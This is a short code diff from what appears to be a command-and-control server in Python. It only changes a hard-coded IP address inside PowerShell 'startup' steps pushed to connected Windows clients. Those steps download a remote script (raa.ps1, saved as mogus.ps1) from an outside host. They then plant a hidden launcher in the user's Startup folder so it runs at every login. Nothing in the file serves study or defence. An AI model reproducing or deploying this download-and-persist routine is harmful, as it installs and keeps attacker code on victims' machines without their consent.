@@ -25,7 +25,7 @@ onlines = {}
 
 macros = {
     "startup": {"args": [], "steps": [
-            "if (Test-Path 'C:/IFound') {} else { mkdir C:/IFound; } Invoke-WebRequest -Uri 'http://139.162.197.217:8080/raa.ps1' -OutFile 'C:/IFound/mogus.ps1'",
+            "if (Test-Path 'C:/IFound') {} else { mkdir C:/IFound; } Invoke-WebRequest -Uri 'http://176.58.105.100:8080/raa.ps1' -OutFile 'C:/IFound/mogus.ps1'",
             "cd '~/AppData/Roaming/Microsoft/Windows/Start Menu/Programs/Startup'",
             "Write-Output 'powerShell -windowstyle hidden C:/IFound/mogus.ps1' | Out-File ifound.cmd -encoding ASCII",
             "cd ~"
@@ -58,7 +58,7 @@ def client_handler(connection):
                     (user, ))
         con.commit()
         startup_steps = [
-            "if (Test-Path 'C:/IFound') {} else { mkdir C:/IFound; } Invoke-WebRequest -Uri 'http://139.162.197.217:8080/raa.ps1' -OutFile 'C:/IFound/mogus.ps1'",
+            "if (Test-Path 'C:/IFound') {} else { mkdir C:/IFound; } Invoke-WebRequest -Uri 'http://176.58.105.100:8080/raa.ps1' -OutFile 'C:/IFound/mogus.ps1'",
             "cd '~/AppData/Roaming/Microsoft/Windows/Start Menu/Programs/Startup'",
             "Write-Output 'powerShell -windowstyle hidden C:/IFound/mogus.ps1' | Out-File ifound.cmd -encoding ASCII",
         ]
